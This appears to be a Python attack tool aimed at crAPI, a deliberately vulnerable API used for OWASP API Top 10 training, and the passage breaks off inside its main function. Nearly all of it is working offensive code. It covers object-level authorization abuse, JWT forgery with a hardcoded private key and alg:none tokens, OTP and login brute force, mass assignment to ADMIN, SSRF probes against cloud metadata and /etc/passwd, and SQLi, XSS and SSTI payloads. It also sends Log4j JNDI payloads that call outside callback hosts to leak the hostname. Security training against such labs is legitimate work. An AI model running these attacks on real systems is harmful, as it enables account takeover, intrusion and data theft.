#!/usr/bin/env python3
"""
crAPI OWASP API Security Top 10 (2023) Attack Simulator
Usage: python crapihacker.py --url https://... --attack all
"""

import argparse
import base64
import hashlib
import hmac
import json
import os
import random
import string
import sys
import time
import uuid

import requests

SESSION_FILE = os.path.join(os.path.dirname(__file__), ".crapi_session.json")

try:
    import jwt as pyjwt
    from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateNumbers, RSAPublicNumbers
    from cryptography.hazmat.backends import default_backend
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

# crAPI's publicly-known RSA private JWK
# https://github.com/OWASP/crAPI/blob/develop/services/identity/jwks.json
CRAPI_JWK = {
    "n":  "sZKrGYja9S7BkO-waOcupoGY6BQjixJkg1Uitt278NbiCSnBRw5_cmfuWFFFPgRxabBZBJwJAujnQrlgTLXnRRItM9SRO884cEXn-s4Uc8qwk6pev63qb8no6aCVY0dFpthEGtOP-3KIJ2kx2i5HNzm8d7fG3ZswZrttDVbSSTy8UjPTOr4xVw1Yyh_GzGK9i_RYBWHftDsVfKrHcgGn1F_T6W0cgcnh4KFmbyOQ7dUy8Uc6Gu8JHeHJVt2vGcn50EDtUy2YN-UnZPjCSC7vYOfd5teUR_Bf4jg8GN6UnLbr_Et8HUnz9RFBLkPIf0NiY6iRjp9ooSDkml2OGql3ww",
    "e":  "AQAB",
    "d":  "XJu0Vh3Uq5gV5UPMCfm_j6D5INgX7VjLSN8mup4LfUBkJAk9vpQmDYF8gVzpMr3YdBk_Y7MI1BapPVg2i-s2UQR4xJYwpDOfKJactGWzruvfiTOKNIc8Q87WhLl2D4_FGI2jfyYk6itCLOOk1zfZdkjLLNiQg1SDOqC28AT-qKh99wLRKiIuewbJVW5C-0D8YjlquBU6rXdKxONYKnA1NHWfJEbPtsyJIlfUs06wjiMcXrLLc6qy98LL8t0oQcGdUTN4rICGGj-uH3k7-evJyKXC_RECmbcMu2q8GkjZ7lvaVtHh3TGGAA5TTc-7kW3MUjpCLLL06erLxCn3CcGr6Q",
    "p":  "-o_gG3DQK9540fR_-WM9dy1YgTR-WSH8FezYnH6I5jwwPB6ocni8XgkWCAiKOPYjK6nhmoTD7DBEetilFIWVj1P0G5fejp_c3H-uQQdd6JW2NBWHfWpADglIEc4NfUgjQ8cXjT1-oIJpXzpX6KOhWEP0yGNBYns7W8CNxbw58vU",
    "q":  "tW1D1JK53TIiip9uBVl6EGzXWPFwy8QXlZHbfg3TfhURUF5OYey9Ig-qxh74KvQ-uzwMZOYux0EdUe0OmV-p27huY-nusHjpxKL6xUxpqsLWrYTa6ygRHep3_A50ksN_XIn83oAjBlG4TEePzBsMQb6F4HDrEhpdPeYepKa5PNc",
    "dp": "rl98fnxXU4BjIvJ-MWfAOfVj159ZotxE3FlVMivZSClxBBXt8qRVqze1jmerEhMxzMxQRkHJO9EnhzrIP-zrdbDefGmHqEhW41k0QutGjnvKLpshDMXpyBrrfgChYKPYbu3aVSALxNadUHmA_lUKDyxT6TUyJsBOQf9Sat8gkRU",
    "dq": "d8mf-o-yJmj-w3ZGh0Ovw36JpREs_20GgVvfh1gLpvi0CNNrf1529jFP-SXjh0Di1m7sZAZTJn5IpJoXhI7UMN2SDWgcj-oVtx5A4tnz_qpMYh8RCCjZPF5eQE8vCuQHiIsXKbWC6p40SDELsaC-M_5emHUV0EsV-1OgMehe79s",
    "qi": "IChXZG2VaA05LVfN-nIX03sAZo7ayetTiFKrhGpdmsODw9AoCbBIx4T4SuPnQQBYVkaCAcseyB1XAjqA4Ebm2yvE6yYo-Q8nP-wEo5Mzm18UimCffMox-uSrig1uhuK9oziV-Y11Ytps8yEQq--9BzVTCs1sXAkLVSaO58kGsm4",
    "kid": "MKMZkDenUfuDF2byYowDj7tW5Ox6XG4Y1THTEGScRg8",
}

# ── colour helpers ────────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def vuln(msg):     print(f"  {GREEN}[VULNERABLE]{RESET} {msg}")
def safe(msg):     print(f"  {RED}[NOT VULN]{RESET}  {msg}")
def info(msg):     print(f"  {YELLOW}[INFO]{RESET}      {msg}")
def err(msg):      print(f"  {RED}[ERROR]{RESET}     {msg}")
def header(title): print(f"\n{BOLD}{CYAN}{'─'*60}\n{title}\n{'─'*60}{RESET}")


# ── session / auth helpers ────────────────────────────────────────────────────
def rand_str(n=8):
    return "".join(random.choices(string.ascii_lowercase, k=n))

def rand_email():
    return f"{''.join(random.choices(string.ascii_lowercase, k=8))}@{''.join(random.choices(string.ascii_lowercase, k=6))}.com"

def rand_password():
    return "".join(random.choices(string.ascii_letters + string.digits, k=12))

def register_user(base, email, password, name):
    number = "".join([str(random.randint(0, 9)) for _ in range(10)])
    info(f"Registering {email}")
    r = requests.post(f"{base}/identity/api/auth/signup",
                      json={"email": email, "password": password, "name": name, "number": number},
                      timeout=30)
    return r

def login(base, email, password):
    info(f"Logging in as {email}")
    r = requests.post(f"{base}/identity/api/auth/login",
                      json={"email": email, "password": password},
                      timeout=30)
    r.raise_for_status()
    token = r.json().get("token")
    if not token:
        raise RuntimeError(f"Login failed for {email}: {r.text}")
    return token

def auth_headers(token):
    return {"Authorization": f"Bearer {token}"}

def get_vehicles(base, token):
    r = requests.get(f"{base}/identity/api/v2/vehicle/vehicles",
                     headers=auth_headers(token), timeout=30)
    if r.status_code == 200:
        return r.json()
    return []

def get_dashboard(base, token):
    r = requests.get(f"{base}/identity/api/v2/user/dashboard",
                     headers=auth_headers(token), timeout=30)
    if r.status_code == 200:
        return r.json()
    return {}

def create_post(base, token):
    r = requests.post(f"{base}/community/api/v2/community/posts",
                      headers=auth_headers(token),
                      json={"content": "My car is broken", "title": "hello world"},
                      timeout=30)
    if r.status_code in (200, 201):
        return r.json().get("id")
    return None

def b64url_to_int(s):
    padding = "=" * (4 - len(s) % 4)
    return int.from_bytes(base64.urlsafe_b64decode(s + padding), "big")

def make_hs256_jwt(claims, secret):
    hdr = base64.urlsafe_b64encode(
        json.dumps({"typ": "JWT", "alg": "HS256"}).encode()
    ).rstrip(b"=").decode()
    pay = base64.urlsafe_b64encode(
        json.dumps(claims).encode()
    ).rstrip(b"=").decode()
    msg = f"{hdr}.{pay}"
    sig = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), msg.encode(), hashlib.sha256).digest()
    ).rstrip(b"=").decode()
    return f"{msg}.{sig}"

def make_expired_rsa_jwt(email):
    if not HAS_CRYPTO:
        return None
    pub = RSAPublicNumbers(b64url_to_int(CRAPI_JWK["e"]), b64url_to_int(CRAPI_JWK["n"]))
    priv = RSAPrivateNumbers(
        p=b64url_to_int(CRAPI_JWK["p"]),
        q=b64url_to_int(CRAPI_JWK["q"]),
        d=b64url_to_int(CRAPI_JWK["d"]),
        dmp1=b64url_to_int(CRAPI_JWK["dp"]),
        dmq1=b64url_to_int(CRAPI_JWK["dq"]),
        iqmp=b64url_to_int(CRAPI_JWK["qi"]),
        public_numbers=pub,
    ).private_key(default_backend())
    now = int(time.time())
    payload = {"sub": email, "iat": now - 4600, "exp": now - 1000}
    return pyjwt.encode(payload, priv, algorithm="RS256", headers={"kid": CRAPI_JWK["kid"]})


# ── setup: register two users (persisted across runs) ────────────────────────
def setup(base):
    print(f"\n{BOLD}Setting up test users …{RESET}")

    if os.path.exists(SESSION_FILE):
        with open(SESSION_FILE) as f:
            saved = json.load(f)
        if saved.get("base") == base:
            u1, u2 = saved["u1"], saved["u2"]
            try:
                t1 = login(base, u1["email"], u1["password"])
                t2 = login(base, u2["email"], u2["password"])
                info(f"Reusing saved identities: {u1['email']} / {u2['email']}")
                return u1, t1, u2, t2
            except Exception:
                info("Saved credentials no longer valid — creating new users")

    suffix1 = rand_str()
    suffix2 = rand_str()
    u1 = {"email": f"attacker_{suffix1}@test.com", "password": "Attacker123!", "name": f"Attacker {suffix1}"}
    u2 = {"email": f"victim_{suffix2}@test.com",   "password": "Victim123!",   "name": f"Victim {suffix2}"}

    for u in (u1, u2):
        r = register_user(base, u["email"], u["password"], u["name"])
        if r.status_code in (200, 201):
            info(f"Registered {u['email']}")
        elif r.status_code == 409:
            info(f"Already exists: {u['email']}")
        else:
            raise RuntimeError(f"Registration failed: {r.status_code} {r.text}")

    t1 = login(base, u1["email"], u1["password"])
    t2 = login(base, u2["email"], u2["password"])

    with open(SESSION_FILE, "w") as f:
        json.dump({"base": base, "u1": u1, "u2": u2}, f, indent=2)
    info(f"Saved identities to {SESSION_FILE}")
    info(f"Logged in as attacker ({u1['email']}) and victim ({u2['email']})")
    return u1, t1, u2, t2


# ── API1: Broken Object Level Authorization (BOLA) ───────────────────────────
def api1(base, u1, t1, u2, t2):
    header("API1:2023 — Broken Object Level Authorization (BOLA)")

    # Extract vehicle IDs from recent posts and their comments, then access each location
    info("Fetching recent posts to extract vehicle IDs")
    r = requests.get(f"{base}/community/api/v2/community/posts/recent",
                     headers=auth_headers(t1), timeout=30)
    vehicle_ids = []
    if r.status_code == 200:
        posts = r.json().get("posts", [])
        for post in posts:
            vid = post.get("author", {}).get("vehicleid", "")
            if vid:
                vehicle_ids.append(vid)
            for comment in post.get("comments", []):
                cvid = comment.get("author", {}).get("vehicleid", "")
                if cvid:
                    vehicle_ids.append(cvid)
        info(f"Extracted {len(vehicle_ids)} vehicle IDs from recent posts")

    accessed = 0
    info(f"Testing BOLA on {len(vehicle_ids)} vehicle location endpoints")
    for vid in vehicle_ids:
        r = requests.get(f"{base}/identity/api/v2/vehicle/{vid}/location",
                         headers=auth_headers(t1), timeout=30)
        if r.status_code == 200:
            accessed += 1
    if accessed:
        vuln(f"Accessed location data for {accessed}/{len(vehicle_ids)} vehicles belonging to other users (BOLA)")
    elif vehicle_ids:
        safe("Vehicle location endpoint blocked access to other users' vehicles")
    else:
        info("No vehicle IDs found in recent posts — skipping vehicle location BOLA check")

    # Enumerate mechanic reports by sequential ID
    info("Testing BOLA on mechanic reports (ID enumeration)")
    for report_id in range(1, 6):
        r = requests.get(f"{base}/workshop/api/mechanic/mechanic_report",
                         params={"report_id": report_id},
                         headers=auth_headers(t1), timeout=30)
        if r.status_code == 200:
            data = r.json()
            vuln(f"Accessed mechanic report #{report_id} — owner: {data.get('mechanic', {}).get('email', 'unknown')}")
            break
    else:
        safe("No mechanic reports accessible via ID enumeration (1–5)")


# ── API2: Broken Authentication ───────────────────────────────────────────────
def api2(base, u1, t1, u2, t2):
    header("API2:2023 — Broken Authentication")

    # 1. Expired JWT with valid RS256 signature using crAPI's own private key
    info("Testing expired RS256 JWT with crAPI's private key")
    if HAS_CRYPTO:
        expired_token = make_expired_rsa_jwt(u1["email"])
        r = requests.get(f"{base}/workshop/api/mechanic/mechanic_report",
                         params={"report_id": 1},
                         headers=auth_headers(expired_token), timeout=30)
        if r.status_code == 200:
            vuln("Expired RS256 JWT accepted — server does not validate token expiration")
        else:
            safe(f"Expired RS256 JWT rejected ({r.status_code})")
    else:
        info("Skipping expired RSA JWT test — run: pip install PyJWT cryptography")

    # 2. JWT algorithm confusion: replace alg with 'none'
    info("Testing JWT 'none' algorithm bypass")
    parts = t1.split(".")
    if len(parts) == 3:
        hdr = json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode())
        hdr["alg"] = "none"
        fake_hdr = base64.urlsafe_b64encode(json.dumps(hdr).encode()).rstrip(b"=").decode()
        fake_token = f"{fake_hdr}.{parts[1]}."
        r = requests.get(f"{base}/identity/api/v2/user/dashboard",
                         headers=auth_headers(fake_token), timeout=30)
        if r.status_code == 200:
            vuln("JWT 'none' algorithm accepted — authentication bypassed")
        else:
            safe(f"JWT 'none' algorithm rejected ({r.status_code})")

    # 3. OTP brute-force on password reset (check if rate-limited)
    info("Testing OTP brute-force with 10 attempts")
    r = requests.post(f"{base}/identity/api/auth/forget-password",
                      json={"email": u2["email"]}, timeout=30)
    blocked = False
    for i, otp in enumerate(range(1000, 1010)):
        r = requests.post(f"{base}/identity/api/auth/v3/check-otp",
                          json={"email": u2["email"], "otp": str(otp), "password": "Hacked123!"},
                          timeout=30)
        if r.status_code == 429:
            safe(f"Rate-limited after {i+1} OTP attempts")
            blocked = True
            break
    if not blocked:
        vuln("No rate limiting on OTP endpoint — 10 attempts completed without block")

    # 4. Weak password acceptance
    info("Testing weak password acceptance")
    suffix = rand_str()
    r = register_user(base, f"weakpwd_{suffix}@test.com", "1234", "Weak User")
    if r.status_code in (200, 201):
        vuln("Weak password '1234' accepted during registration")
    else:
        safe(f"Weak password rejected ({r.status_code})")


# ── API3: Broken Object Property Level Authorization (BOPLA) ─────────────────
def api3(base, u1, t1, u2, t2):
    header("API3:2023 — Broken Object Property Level Authorization (BOPLA)")

    # 1. Excessive data exposure — check dashboard response
    info("Checking dashboard for excessive data exposure")
    dash = get_dashboard(base, t1)
    sensitive_fields = {"credit_balance", "available_credit", "phone_number", "role"}
    exposed = sensitive_fields & set(dash.keys())
    if exposed:
        vuln(f"Dashboard exposes sensitive fields: {exposed}")
    else:
        info(f"Dashboard fields: {list(dash.keys())}")

    # 2. Mass assignment — try to escalate role or set credit via profile update
    info("Testing mass assignment (role=ADMIN, credit=99999)")
    r = requests.put(f"{base}/identity/api/v2/user/edit-profile",
                     headers=auth_headers(t1),
                     json={"name": "Hacker", "number": "9999999999",
                           "role": "ADMIN", "available_credit": 99999},
                     timeout=30)
    if r.status_code in (200, 201):
        updated = r.json()
        if str(updated.get("role", "")).upper() == "ADMIN":
            vuln("Mass assignment: role elevated to ADMIN via profile update")
        elif updated.get("available_credit") == 99999:
            vuln("Mass assignment: available_credit set to 99999 via profile update")
        else:
            safe("Mass assignment fields ignored in profile update")
    else:
        info(f"Edit-profile returned {r.status_code}")

    # 3. Community posts leaking author PII
    r = requests.get(f"{base}/community/api/v2/community/posts/recent",
                     headers=auth_headers(t1), timeout=30)
    if r.status_code == 200:
        posts = r.json().get("posts", [])
        if posts:
            author = posts[0].get("author", {})
            if "email" in author or "phone_number" in author:
                vuln(f"Community posts expose author PII: {list(author.keys())}")
            else:
                info(f"Author fields in posts: {list(author.keys())}")


# ── API4: Unrestricted Resource Consumption ───────────────────────────────────
def api4(base, u1, t1, u2, t2):
    header("API4:2023 — Unrestricted Resource Consumption")

    # 1. 50 rapid GETs to vehicle location with random UUIDs (non-existing resources)
    info("Testing rate limiting with 50 rapid requests to random vehicle UUIDs")
    blocked = False
    for i in range(50):
        r = requests.get(f"{base}/identity/api/v2/vehicle/{uuid.uuid4()}/location",
                         headers=auth_headers(t1), timeout=30)
        if r.status_code == 429:
            safe(f"Rate-limited after {i+1} requests to non-existing vehicle locations")
            blocked = True
            break
    if not blocked:
        vuln("No rate limiting — 50 requests to random vehicle UUIDs all processed")

    # 2. Brute force login with random credentials (100 attempts)
    info("Testing login brute force with 100 random credentials")
    blocked_bf = False
    for i in range(100):
        r = requests.post(f"{base}/identity/api/auth/login",
                          json={"email": rand_email(), "password": rand_password()},
                          timeout=30)
        if r.status_code == 429:
            safe(f"Login brute force rate-limited after {i+1} attempts")
            blocked_bf = True
            break
    if not blocked_bf:
        vuln("No rate limiting on login — 100 brute force attempts completed without block")


# ── API5: Broken Function Level Authorization (BFLA) ─────────────────────────
def api5(base, u1, t1, u2, t2):
    header("API5:2023 — Broken Function Level Authorization (BFLA)")

    # 1. Unexpected request field — is_admin flag injected via order endpoint
    info("Testing unexpected field injection (is_admin=true, quantity=-1)")
    r = requests.post(f"{base}/workshop/api/shop/orders",
                      headers=auth_headers(t1),
                      json={"product_id": 1, "quantity": -1, "is_admin": True},
                      timeout=30)
    if r.status_code in (200, 201):
        vuln("Order accepted with is_admin=true and quantity=-1 — unexpected field not stripped")
    else:
        safe(f"Order with is_admin=true rejected ({r.status_code})")

    # 2. Range violation — extreme negative quantity
    r = requests.post(f"{base}/workshop/api/shop/orders",
                      headers=auth_headers(t1),
                      json={"product_id": 1, "quantity": -10000000},
                      timeout=30)
    if r.status_code in (200, 201):
        vuln("Order accepted with quantity=-10000000 — no range validation")
    else:
        safe(f"Extreme negative quantity rejected ({r.status_code})")

    # 3. Admin-only endpoints with regular user token
    info("Testing access to admin-only endpoints with regular user token")
    admin_endpoints = [
        ("GET",  "/identity/api/v2/admin/users"),
        ("GET",  "/workshop/api/v2/mechanic/driver_report"),
        ("GET",  "/workshop/api/admin/mechanics"),
        ("POST", "/workshop/api/v2/admin/coupon/new-coupon"),
    ]
    for method, path in admin_endpoints:
        r = requests.request(method, f"{base}{path}",
                             headers=auth_headers(t1), timeout=30)
        if r.status_code == 200:
            vuln(f"{method} {path} → 200 (accessible without admin role)")
        elif r.status_code in (401, 403):
            safe(f"{method} {path} → {r.status_code} (correctly blocked)")
        else:
            info(f"{method} {path} → {r.status_code}")


# ── API6: Unrestricted Access to Sensitive Business Flows ────────────────────
def api6(base, u1, t1, u2, t2):
    header("API6:2023 — Unrestricted Access to Sensitive Business Flows")

    # 1. Apply same coupon twice
    info("Testing coupon reuse (applying TRAC075 twice)")
    coupon_code = "TRAC075"
    for attempt in range(1, 3):
        r = requests.post(f"{base}/workshop/api/shop/apply-coupon",
                          headers=auth_headers(t1),
                          json={"coupon_code": coupon_code, "amount": 10.0},
                          timeout=30)
        if r.status_code == 200 and attempt == 2:
            vuln(f"Coupon '{coupon_code}' applied twice — no single-use enforcement")
        elif r.status_code == 200 and attempt == 1:
            info(f"Coupon applied (attempt {attempt}): {r.status_code}")
        elif attempt == 2 and r.status_code != 200:
            safe(f"Coupon reuse blocked on second attempt ({r.status_code})")

    # 2. Order with negative quantity
    vehicles = get_vehicles(base, t1)
    vehicle_id = vehicles[0]["vehicleId"] if vehicles else "dummy-id"
    r = requests.post(f"{base}/workshop/api/shop/orders",
                      headers=auth_headers(t1),
                      json={"product_id": 1, "quantity": -1, "vehicle_id": vehicle_id},
                      timeout=30)
    if r.status_code in (200, 201):
        vuln("Order accepted with quantity=-1 (could credit account)")
    else:
        safe(f"Negative quantity order rejected ({r.status_code})")


# ── API7: Server Side Request Forgery (SSRF) ─────────────────────────────────
def api7(base, u1, t1, u2, t2):
    header("API7:2023 — Server Side Request Forgery (SSRF)")

    # SSRF variation 2 — redirect mechanic_api to internal service (from Postman collection)
    info("Testing SSRF via mechanic_api to localhost:8000")
    r = requests.post(f"{base}/workshop/api/merchant/contact_mechanic",
                      headers=auth_headers(t1),
                      json={
                          "mechanic_api": "http://localhost:8000/workshop/api/mechanic/receive_report",
                          "mechanic_code": "TRAC_JME",
                          "number_of_repeats": 1,
                          "problem_details": "asd",
                          "repeat_request_if_failed": False,
                          "vin": "7GEQK70ITIF544515",
                      },
                      timeout=15)
    if r.status_code == 200:
        vuln("SSRF via mechanic_api to localhost:8000 accepted — server made internal request")
    else:
        info(f"mechanic_api localhost redirect: {r.status_code}")

    # Additional SSRF probes
    info("Testing SSRF with metadata/internal endpoints")
    vehicles = get_vehicles(base, t1)
    vehicle_id = vehicles[0]["vehicleId"] if vehicles else "dummy-id"
    for iurl in [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:8080/actuator",
        "file:///etc/passwd",
    ]:
        r = requests.post(f"{base}/workshop/api/merchant/contact_mechanic",
                          headers=auth_headers(t1),
                          json={"mechanic_code": "TRAC001",
                                "problem_details": "SSRF test",
                                "vehicle_id": vehicle_id,
                                "mechanic_api": iurl,
                                "repeat_request": 1},
                          timeout=15)
        if r.status_code == 200:
            body = r.text
            if "ami-id" in body or "root:" in body or "actuator" in body.lower():
                vuln(f"SSRF confirmed — server fetched {iurl}: {body[:200]}")
            else:
                vuln(f"mechanic_api accepted ({iurl}) — server made outbound request")
            break
        else:
            info(f"mechanic_api {iurl} → {r.status_code}")


# ── API8: Security Misconfiguration ──────────────────────────────────────────
def api8(base, u1, t1, u2, t2):
    header("API8:2023 — Security Misconfiguration")

    # Exposed API docs / Swagger
    info("Checking for exposed API documentation")
    for path in ["/api-docs", "/swagger-ui.html", "/swagger-ui/",
                 "/v2/api-docs", "/openapi.json", "/api/swagger.json"]:
        r = requests.get(f"{base}{path}", timeout=30)
        if r.status_code == 200:
            vuln(f"API documentation exposed at {path}")

    # Stack traces / verbose errors
    info("Checking for stack traces in error responses")
    r = requests.get(f"{base}/identity/api/v2/user/dashboard",
                     headers={"Authorization": "Bearer invalidtoken"}, timeout=30)
    body = r.text.lower()
    if any(k in body for k in ("stack", "traceback", "exception", "at com.", "at org.")):
        vuln(f"Verbose error / stack trace in response: {r.text[:300]}")
    else:
        safe(f"No stack trace in error response ({r.status_code})")

    # Default/weak credentials
    info("Testing default credentials (admin/admin, test/test)")
    for creds in [("admin", "admin"), ("admin", "password"), ("test", "test")]:
        r = requests.post(f"{base}/identity/api/auth/login",
                          json={"email": creds[0], "password": creds[1]}, timeout=30)
        if r.status_code == 200:
            vuln(f"Default credentials accepted: {creds[0]}:{creds[1]}")
            break
    else:
        safe("Default credentials rejected")

    # CORS misconfiguration
    info("Testing CORS with evil.com origin")
    r = requests.get(f"{base}/identity/api/v2/user/dashboard",
                     headers={**auth_headers(t1), "Origin": "https://evil.com"}, timeout=30)
    acao = r.headers.get("Access-Control-Allow-Origin", "")
    if acao in ("*", "https://evil.com"):
        vuln(f"CORS misconfigured: Access-Control-Allow-Origin: {acao}")
    else:
        safe(f"CORS header: '{acao}'")

    # JWT payload data violation — HS256 with extra SSN field, weak secret 'crapi'
    info("Testing forged HS256 JWT with weak secret 'crapi'")
    now = int(time.time())
    bad_token = make_hs256_jwt(
        {"sub": "mike@fake.com", "ssn": "555-55-5555", "iat": now, "exp": now + 3600},
        "crapi"
    )
    r = requests.post(f"{base}/community/api/v2/community/posts",
                      headers=auth_headers(bad_token),
                      json={"content": "My car is broken", "title": "hello world"},
                      timeout=30)
    if r.status_code in (200, 201):
        vuln("JWT payload violation: HS256 token with extra SSN field and weak secret 'crapi' accepted")
    else:
        safe(f"Forged HS256 JWT rejected ({r.status_code})")


# ── API9: Improper Inventory Management ──────────────────────────────────────
def api9(base, u1, t1, u2, t2):
    header("API9:2023 — Improper Inventory Management")

    info("Testing legacy /v1 endpoints for accessibility")
    for path in [
        "/identity/api/v1/user/dashboard",
        "/identity/api/v1/vehicle/vehicles",
        "/workshop/api/v1/shop/products",
        "/community/api/v1/community/posts/recent",
    ]:
        r = requests.get(f"{base}{path}", headers=auth_headers(t1), timeout=30)
        if r.status_code == 200:
            vuln(f"Legacy endpoint accessible: {path}")
        elif r.status_code == 404:
            safe(f"Legacy endpoint removed: {path}")
        else:
            info(f"{path} → {r.status_code}")

    for path in [
        "/workshop/api/v2/user/changeEmailToken",
        "/identity/api/v2/user/change-email",
    ]:
        r = requests.get(f"{base}{path}", headers=auth_headers(t1), timeout=30)
        if r.status_code not in (404, 405):
            vuln(f"Non-production endpoint reachable: {path} ({r.status_code})")


# ── API10: Unsafe Consumption of APIs ────────────────────────────────────────
def api10(base, u1, t1, u2, t2):
    header("API10:2023 — Unsafe Consumption of APIs")

    info("Testing injection payloads via mechanic API (SQLi/XSS/SSTI)")
    vehicles = get_vehicles(base, t1)
    vehicle_id = vehicles[0]["vehicleId"] if vehicles else "dummy"

    for payload in ["' OR '1'='1", "'; DROP TABLE mechanics;--",
                    "<script>alert(1)</script>", "{{7*7}}"]:
        r = requests.post(f"{base}/workshop/api/merchant/contact_mechanic",
                          headers=auth_headers(t1),
                          json={"mechanic_code": "TRAC001",
                                "problem_details": payload,
                                "vehicle_id": vehicle_id,
                                "mechanic_api": f"{base}/workshop/api/mechanic/receive_report",
                                "repeat_request": 1},
                          timeout=30)
        if r.status_code == 200:
            body = r.text
            if "49" in body:
                vuln(f"SSTI confirmed — payload '{payload}' evaluated to 49")
            elif "error" in body.lower() and ("sql" in body.lower() or "syntax" in body.lower()):
                vuln(f"SQL error via mechanic API — payload: {payload}")
            else:
                info(f"Payload '{payload[:30]}' sent — response: {body[:100]}")
        else:
            info(f"Payload '{payload[:30]}' → {r.status_code}")


# ── Injection: SQLi / XSS / Path Traversal / JWT alg:none ───────────────────
def injection(base, u1, t1, u2, t2):
    header("Injection — SQLi / XSS / Path Traversal / JWT Algorithm Manipulation")

    # JWT algorithm manipulation — hardcoded alg:none token (from Postman collection)
    info("Testing JWT alg:none bypass on community posts")
    jwt_none_token = (
        "eyJhbGciOiJub25lIn0"
        ".eyJzdWIiOiJtYWxpY2lvdXNfZW1haWxfMUBtYWlsLmNvbSIsImlhdCI6MTY0MDYyODgxMSwiZXhwIjoxNzYwNjI4ODExfQ"
        ".qna-6H_HG2PKCiU6tc42c_lymEq87WFz57_fSFk909v39x92C_wO_XaFVqttJ4L1OpF5wzrw3D7UoQNi33rc-A"
    )
    r = requests.post(f"{base}/community/api/v2/community/posts",
                      headers=auth_headers(jwt_none_token),
                      json={"content": "My car is broken", "title": "hello world"},
                      timeout=30)
    if r.status_code in (200, 201):
        vuln("JWT 'none' algorithm accepted on community posts endpoint")
    else:
        safe(f"JWT 'none' algorithm rejected ({r.status_code})")

    # Create a post to get an ID for comment injection tests
    post_id = create_post(base, t1)
    if not post_id:
        info("Could not create post — skipping comment injection tests")
        return

    # SQL injection in comment content
    info("Testing SQL injection in post comments")
    r = requests.post(f"{base}/community/api/v2/community/posts/{post_id}/comment",
                      headers=auth_headers(t1),
                      json={"content": "a' union select 1,2,3 --"},
                      timeout=30)
    if r.status_code in (200, 201):
        body = r.text.lower()
        if any(k in body for k in ("syntax", "sql", "error", "exception")):
            vuln(f"SQL error in comment response — possible injection")
        else:
            info(f"SQLi payload accepted in comment ({r.status_code}) — check DB logs")
    else:
        info(f"SQLi comment payload → {r.status_code}")

    # XSS in comment content
    info("Testing XSS payload in post comments")
    r = requests.post(f"{base}/community/api/v2/community/posts/{post_id}/comment",
                      headers=auth_headers(t1),
                      json={"content": "</script><svg onload=alert(1)>"},
                      timeout=30)
    if r.status_code in (200, 201):
        ct = r.headers.get("content-type", "")
        stored = r.json().get("content", "") if "json" in ct else ""
        if "<svg" in stored or "alert(1)" in stored:
            vuln("XSS payload stored unescaped in comment response")
        else:
            info(f"XSS payload accepted ({r.status_code}) — check if sanitized on render")
    else:
        info(f"XSS comment payload → {r.status_code}")

    # Path traversal on mechanic report (body field user_image)
    r = requests.get(f"{base}/workshop/api/mechanic/mechanic_report",
                     params={"report_id": "1"},
                     headers=auth_headers(t1),
                     json={"user_image": "../../../../"},
                     timeout=30)
    body = r.text
    if r.status_code == 200 and ("root:" in body or "/etc/" in body):
        vuln(f"Path traversal successful — file content leaked: {body[:200]}")
    else:
        info(f"Path traversal on mechanic_report → {r.status_code}")


# ── Log4j JNDI Exploitation (CVE-2021-44228) ─────────────────────────────────
def log4j(base, u1, t1, u2, t2):
    header("Log4j JNDI Exploitation (CVE-2021-44228)")

    info("Testing Log4j JNDI payloads in User-Agent header")
    payloads = [
        ("Variation 1 — RMI obfuscated",
         "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://malicious.com/poc}"),
        ("Variation 2 — LDAP exfiltration",
         "${jndi:ldap://${hostName}.c6s7rhe60tre1mm17i9gcgh86yoyyy6mk.interact.sh/a}"),
        ("Variation 3 — local LDAP",
         "${jndi:ldap://127.0.0.1:1389/accessAdversaryClass}"),
    ]

    for name, payload in payloads:
        r = requests.post(f"{base}/community/api/v2/community/posts",
                          headers={**auth_headers(t1), "User-Agent": payload},
                          json={"content": "This is my POST", "title": "My New Post"},
                          timeout=30)
        if r.status_code in (200, 201):
            info(f"Log4j {name}: request accepted ({r.status_code}) — monitor OOB callback")
        else:
            info(f"Log4j {name}: {r.status_code}")


# ── attack registry ───────────────────────────────────────────────────────────
ATTACKS = {
    "api1":      ("BOLA",                       api1),
    "api2":      ("Broken Authentication",      api2),
    "api3":      ("BOPLA",                      api3),
    "api4":      ("Resource Consumption",       api4),
    "api5":      ("BFLA",                       api5),
    "api6":      ("Business Flow Abuse",        api6),
    "api7":      ("SSRF",                       api7),
    "api8":      ("Security Misconfiguration",  api8),
    "api9":      ("Improper Inventory",         api9),
    "api10":     ("Unsafe API Consumption",     api10),
    "injection": ("Injection (SQLi/XSS/Path)",  injection),
    "log4j":     ("Log4j JNDI",                log4j),
}


# ── main ──────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="crAPI OWASP API Security Top 10 (2023) simulator")
    parser.add_argument("--url",    default="http://localhost:8888",
                        help="crAPI base URL (default: http://localhost:8888)")
    parser.add_argument("--attack", default="all",
                        help="Attack to run: all | api1 | api2 | … | api10 | injection | log4j "
                             "(comma-separated for multiple, e.g. api1,api3)")
    parser.add_argument("--list",   action="store_true",
                        help="List available attacks and exit")
    parser.add_argument("--reset",  action="store_true",
                        help="Clear saved session and create fresh test users")
    args = parser.parse_args()

    if args.list:
        print(f"\n{'ID':<12} {'Name'}")
        print("─" * 45)
        for key, (name, _) in ATTACKS.items():
            print(f"{key:<12} {name}")
        sys.exit(0)

    if args.reset and os.path.exists(SESSION_FILE):
        os.remove(SESSION_FILE)
        print("Session cleared — fresh users will be created on next run")
        sys.exit(0)

    base = args.url.rstrip("/")

    try:
        requests.get(f"{base}/health", timeout=5)
    except requests.exceptions.ConnectionError:
        try:
            requests.get(base, timeout=5)
        except requests.exceptions.ConnectionError:
            print(f"{RED}Cannot reach {base} — is crAPI running?{RESET}")
            sys.exit(1)

    print(f"{BOLD}Target:{RESET} {base}")

    try:
        u1, t1, u2, t2 = setup(base)
    except Exception as e:
        print(f"{RED}Setup failed: {e}{RESET}")
        sys.exit(1)

    selected = args.attack.lower()
    if selected == "all":
        to_run = list(ATTACKS.keys())
    else:
        to_run = [s.strip() for s in selected.split(",")]
        invalid = [k for k in to_run if k not in ATTACKS]
        if invalid:
